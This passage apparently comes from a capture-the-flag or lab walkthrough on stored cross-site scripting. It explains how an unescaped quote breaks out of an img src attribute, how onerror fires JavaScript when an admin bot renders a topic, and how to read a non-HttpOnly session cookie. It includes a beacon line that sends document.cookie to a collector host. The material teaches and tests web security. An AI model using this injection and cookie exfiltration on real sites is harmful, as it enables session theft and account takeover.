You are inside a double-quoted attribute value: `<img src="...">`. Escaping the
body handled `<` and `>`, but nobody encoded the **quote** that delimits the
attribute. If your URL contains a `"`, it closes `src` early and everything after
it becomes **new attributes** on the same `<img>` tag.

`<img src="x" ...>` where `x` is not a real image will fail to load — and the
`<img>` attribute that runs JavaScript **on load failure** is `onerror`. It needs
no click and no form submit; it fires the moment the tag is rendered.

Who renders your post? The admin bot loads `GET /admin/topics` every ~2 seconds
(you get `403` there — it holds the admin `session` cookie, which is **not**
`HttpOnly`, so `document.cookie` can read it). Anyone can `POST /topics`, and
your topic shows up on that admin board.

To get the cookie out: the only listener reachable from the bot's network is the
collector at `http://collector:9000/`. An image beacon —
`new Image().src = 'http://collector:9000/report?c=' + encodeURIComponent(document.cookie)`
— fires a cross-origin GET with no CORS worries.
